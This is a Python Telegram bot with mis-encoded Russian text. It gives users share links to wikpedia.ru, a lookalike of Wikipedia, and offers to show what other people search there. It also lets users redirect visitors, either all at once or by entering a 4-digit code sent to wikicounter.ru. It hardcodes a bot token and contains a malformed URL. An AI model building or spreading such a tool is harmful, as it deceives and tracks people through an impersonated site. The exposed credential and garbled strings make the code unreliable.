from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import logging
from datetime import datetime, timedelta
from threading import Lock
import asyncio
import aiohttp

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–æ–≤
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


BOT_TOKEN = '7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU'
BASE_SITE_URL = 'https://wikpedia.ru'  # URL –≤–∞—à–µ–≥–æ Flask-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ref_link = f"{BASE_SITE_URL}?ref={user_id}"
    
    keyboard = [
        [InlineKeyboardButton("üîó –ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å–∞–π—Ç", url=ref_link)],
        [InlineKeyboardButton("üîÑ –°–±—Ä–æ—Å–∏—Ç—å –≤—Å–µ—Ö", callback_data="reset")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"–ü—Ä–∏–≤–µ—Ç, {update.effective_user.first_name}!\n"
        f"–í–æ—Ç —Ç–≤–æ—è —É–Ω–∏–∫–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:\n{ref_link}\n\n"
        "üîé –ü–æ–¥–µ–ª–∏—Å—å –µ—é, —á—Ç–æ–±—ã –≤–∏–¥–µ—Ç—å, —á—Ç–æ –∏—â—É—Ç –¥—Ä—É–≥–∏–µ!\n"
        "üîÑ –ù–∞–∂–º–∏ '–°–±—Ä–æ—Å–∏—Ç—å –≤—Å–µ—Ö', —á—Ç–æ–±—ã –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç—å –≤—Å–µ—Ö –Ω–∞ –í–∏–∫–∏–ø–µ–¥–∏—é",
        reply_markup=reply_markup
    )

# reset_callback
async def reset_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.callback_query.answer()

    async with aiohttp.ClientSession() as session:
        await session.get(f"{BASE_SITE_URL}/trigger_reset?ref={user_id}")

    await update.callback_query.edit_message_text(
        "üîÑ –°–±—Ä–æ—Å –≤—ã–ø–æ–ª–Ω–µ–Ω! –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ —Å–∫–æ—Ä–æ –±—É–¥—É—Ç –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ –í–∏–∫–∏–ø–µ–¥–∏—é.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("üîó –ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å–∞–π—Ç", url=f"{BASE_SITE_URL}?ref={user_id}")]
        ])
    )

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip()
    
    if not code.isdigit() or len(code) != 4:
        await update.message.reply_text("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ 4-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥.")
        return
    
    ref_link = f"{BASE_SITE_URL}/?ref={user_id}"  # URL –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Å–∞–π—Ç–∞
    
    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://https://wikicounter.ru//update_code",
            json={'code': code, 'new_url': ref_link}
        ) as response:
            result = await response.json()
            
            if result.get('status') == 'success':
                await update.message.reply_text(
                    "‚úÖ –ö–æ–¥ –ø—Ä–∏–Ω—è—Ç! –¢–µ–ø–µ—Ä—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –±—É–¥–µ—Ç –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à—É —Å—Å—ã–ª–∫—É.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("üîó –ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å–∞–π—Ç", url=ref_link)]
                    ])
                )
            else:
                await update.message.reply_text("‚ùå –ö–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ —É—Å—Ç–∞—Ä–µ–ª.")


def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(reset_callback, pattern="^reset$"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code))
    
    application.run_polling(drop_pending_updates=True)



if __name__ == '__main__':
    main()  # –í–∞–∂–Ω–æ! –ë–µ–∑ —ç—Ç–æ–≥–æ –∫–æ–¥ –Ω–µ –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è.